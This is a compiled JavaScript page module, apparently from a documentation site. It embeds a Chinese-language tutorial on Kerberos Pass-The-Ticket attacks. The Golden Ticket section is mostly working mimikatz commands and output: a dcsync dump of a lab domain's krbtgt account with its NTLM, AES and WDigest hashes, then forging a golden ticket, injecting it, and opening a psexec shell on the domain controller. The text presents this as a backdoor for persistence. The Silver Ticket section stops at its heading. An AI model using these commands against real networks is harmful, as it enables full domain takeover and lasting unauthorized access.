import{_ as e,K as i,L as d,W as n}from"./framework-edebdfe1.js";const a={},l=n(`<h1 id="pass-the-ticket" tabindex="-1"><a class="header-anchor" href="#pass-the-ticket" aria-hidden="true">#</a> Pass-The-Ticket</h1><h2 id="golden-ticket" tabindex="-1"><a class="header-anchor" href="#golden-ticket" aria-hidden="true">#</a> Golden Ticket</h2><p>用户的Ticket都是由krbtgt用户的密码Hash来生成的，我们如果拿到了krbtgt的密码Hash，就可以随意伪造Ticket。需要域控权限，通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket，作为后门，权限维持。</p><ul><li>域控导出ticket</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz.exe &quot;lsadump::dcsync /domain:deelmind.lab /user:krbtgt&quot;

mimikatz # lsadump::dcsync /domain:deelmind.lab /user:krbtgt
[DC] &#39;deelmind.lab&#39; will be the domain
[DC] &#39;root.deelmind.lab&#39; will be the DC server
[DC] &#39;krbtgt&#39; will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 9/14/2022 11:13:52 AM
Object Security ID   : S-1-5-21-3330634377-1326264276-632209373-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: cd6abf9b42e7868f57f93b552f742b9c
    ntlm- 0: cd6abf9b42e7868f57f93b552f742b9c
    lm  - 0: f1ab4055f6dca0d07e2183869fb6c2ca

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 20e2676c969e45622693cb6511d01f36

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEELMIND.LABkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fe980d389a9b62613e33d564d3ca48c5021f3160109296cd9bd389c1c830ef77
      aes128_hmac       (4096) : 2914426d164fcfa1c15e72a75af77cee
      des_cbc_md5       (4096) : 7a4cdc6780a25d45

* Primary:Kerberos *
    Default Salt : DEELMIND.LABkrbtgt
    Credentials
      des_cbc_md5       : 7a4cdc6780a25d45

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  af4fe16941bd313bbf2ef149248c639d
    02  5b38bb373faccdc3d50ec687bed0f072
    03  92153413c2eec54c4d38db172017a11f
    04  af4fe16941bd313bbf2ef149248c639d
    05  5b38bb373faccdc3d50ec687bed0f072
    06  1f8cee689ea4946a9936692c077a79d9
    07  af4fe16941bd313bbf2ef149248c639d
    08  a5efbbc949a516e12b0f69d2fda141f9
    09  a5efbbc949a516e12b0f69d2fda141f9
    10  5abb1c7332696c8a51f09109bbe938bb
    11  2a5d76a74663d655e6d473af3f6c165f
    12  a5efbbc949a516e12b0f69d2fda141f9
    13  8d1d6d32034e6c30a6db63ccffe36f3b
    14  2a5d76a74663d655e6d473af3f6c165f
    15  53ee835be5e7b506750e11574342abfd
    16  53ee835be5e7b506750e11574342abfd
    17  f7ea17c32130a6cd61258819d9e5159a
    18  7c15d93df1dde87a13c746c4d8bebbe2
    19  7bc29089fe6ea151a0039e129ca1cdeb
    20  8372a716f91670956c78ca8090771033
    21  570ad2383d538a594f38d10df3574e1e
    22  570ad2383d538a594f38d10df3574e1e
    23  099b387eb5e41ce2066330c22d492ecc
    24  efa161d88c90757635102d71a0649f8c
    25  efa161d88c90757635102d71a0649f8c
    26  036fcd5cb59c947e64002443196366fb
    27  ed634dc7ad2ad97fe21469f428b018b5
    28  dc31f96947e051767177a9297be82e8e
    29  01b87c9ce4f727ce59fafdfb7029991b
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>伪造ticket</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz.exe &quot;kerberos::golden /domain:deelmind.lab /aes256:fe980d389a9b62613e33d564d3ca48c5021f3160109296cd9bd389c1c830ef77 /sid:S-1-5-21-3330634377-1326264276-632209373-502 /krbtgt:cd6abf9b42e7868f57f93b552f742b9c /user:anyone /ticket:golden.kirbi&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>导入ticket</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz.exe &quot;kerberos::ptt golden.kirbi&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>PSExec连接</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>psexec \\\\root.deelmind.lab cmd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="silver-ticket" tabindex="-1"><a class="header-anchor" href="#silver-ticket" aria-hidden="true">#</a> Silver Ticket</h2>`,12),s=[l];function c(b,r){return i(),d("div",null,s)}const t=e(a,[["render",c],["__file","ptt.html.vue"]]);export{t as default};
